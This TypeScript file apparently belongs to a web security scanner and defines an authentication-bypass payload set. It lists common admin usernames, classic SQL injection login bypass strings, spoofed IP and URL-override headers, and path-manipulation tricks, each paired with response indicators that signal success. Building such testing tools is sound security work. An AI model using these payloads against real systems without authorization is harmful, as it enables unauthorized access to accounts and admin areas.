import { Payload, PayloadSet, generatePayloadId } from "./payload-types";

const credentialPayloads: Payload[] = [
  {
    id: generatePayloadId("auth_bypass", "error_based", 1),
    category: "auth_bypass",
    technique: "error_based",
    riskLevel: "safe",
    value: "admin",
    description: "Common admin username",
    expectedBehavior: "Different response for valid username",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "error_based", 2),
    category: "auth_bypass",
    technique: "error_based",
    riskLevel: "safe",
    value: "administrator",
    description: "Administrator username",
    expectedBehavior: "Different response for valid username",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "error_based", 3),
    category: "auth_bypass",
    technique: "error_based",
    riskLevel: "safe",
    value: "root",
    description: "Root username",
    expectedBehavior: "Different response for valid username",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "error_based", 4),
    category: "auth_bypass",
    technique: "error_based",
    riskLevel: "safe",
    value: "test",
    description: "Test account username",
    expectedBehavior: "Different response for valid username",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
];

const sqliBypassPayloads: Payload[] = [
  {
    id: generatePayloadId("auth_bypass", "boolean_based", 1),
    category: "auth_bypass",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "' OR '1'='1",
    description: "Classic SQL injection authentication bypass",
    expectedBehavior: "Bypass authentication via SQL injection",
    successIndicators: [
      "welcome",
      "logged in",
      "dashboard",
      "admin",
      "success",
    ],
    failureIndicators: [
      "invalid",
      "incorrect",
      "failed",
    ],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "boolean_based", 2),
    category: "auth_bypass",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "' OR '1'='1'--",
    description: "SQL injection with comment",
    expectedBehavior: "Bypass authentication",
    successIndicators: [
      "welcome",
      "logged in",
    ],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "boolean_based", 3),
    category: "auth_bypass",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "admin'--",
    description: "Comment out password check",
    expectedBehavior: "Login as admin without password",
    successIndicators: [
      "admin",
      "welcome",
    ],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "boolean_based", 4),
    category: "auth_bypass",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "\" OR \"1\"=\"1",
    description: "Double quote SQL injection bypass",
    expectedBehavior: "Bypass authentication",
    successIndicators: [
      "welcome",
    ],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "boolean_based", 5),
    category: "auth_bypass",
    technique: "boolean_based",
    riskLevel: "safe",
    value: "') OR ('1'='1",
    description: "Parenthesis-based SQL bypass",
    expectedBehavior: "Bypass with parenthesis closure",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["body_param"],
    encoding: "none",
  },
];

const headerBypassPayloads: Payload[] = [
  {
    id: generatePayloadId("auth_bypass", "blind", 1),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "X-Forwarded-For: 127.0.0.1",
    description: "IP spoofing via X-Forwarded-For",
    expectedBehavior: "Bypass IP-based restrictions",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["header"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 2),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "X-Original-URL: /admin",
    description: "URL override header bypass",
    expectedBehavior: "Access restricted URL via header",
    successIndicators: [
      "admin",
      "dashboard",
    ],
    failureIndicators: [],
    applicableContexts: ["header"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 3),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "X-Rewrite-URL: /admin",
    description: "URL rewrite header bypass",
    expectedBehavior: "Access restricted URL via header",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["header"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 4),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "X-Custom-IP-Authorization: 127.0.0.1",
    description: "Custom IP authorization header",
    expectedBehavior: "Bypass via custom header",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["header"],
    encoding: "none",
  },
];

const pathBypassPayloads: Payload[] = [
  {
    id: generatePayloadId("auth_bypass", "blind", 10),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "/admin/",
    description: "Trailing slash bypass",
    expectedBehavior: "Access admin with trailing slash",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 11),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "/ADMIN",
    description: "Case variation bypass",
    expectedBehavior: "Access via different case",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 12),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "/admin;",
    description: "Semicolon path bypass",
    expectedBehavior: "Access via semicolon suffix",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 13),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "/admin%00",
    description: "Null byte path bypass",
    expectedBehavior: "Access via null byte",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 14),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "//admin",
    description: "Double slash bypass",
    expectedBehavior: "Access via double slash",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["path"],
    encoding: "none",
  },
  {
    id: generatePayloadId("auth_bypass", "blind", 15),
    category: "auth_bypass",
    technique: "blind",
    riskLevel: "safe",
    value: "/./admin",
    description: "Dot segment bypass",
    expectedBehavior: "Access via dot segment",
    successIndicators: [],
    failureIndicators: [],
    applicableContexts: ["path"],
    encoding: "none",
  },
];

export const authBypassPayloadSet: PayloadSet = {
  category: "auth_bypass",
  name: "Authentication Bypass Payloads",
  description: "Payloads for bypassing authentication via SQL injection, headers, and path manipulation",
  payloads: [
    ...credentialPayloads,
    ...sqliBypassPayloads,
    ...headerBypassPayloads,
    ...pathBypassPayloads,
  ],
};

export function getAuthBypassPayloads(technique?: string): Payload[] {
  if (!technique) return authBypassPayloadSet.payloads;
  return authBypassPayloadSet.payloads.filter(p => p.technique === technique);
}

export function getHeaderBypassPayloads(): Payload[] {
  return headerBypassPayloads;
}

export function getPathBypassPayloads(): Payload[] {
  return pathBypassPayloads;
}
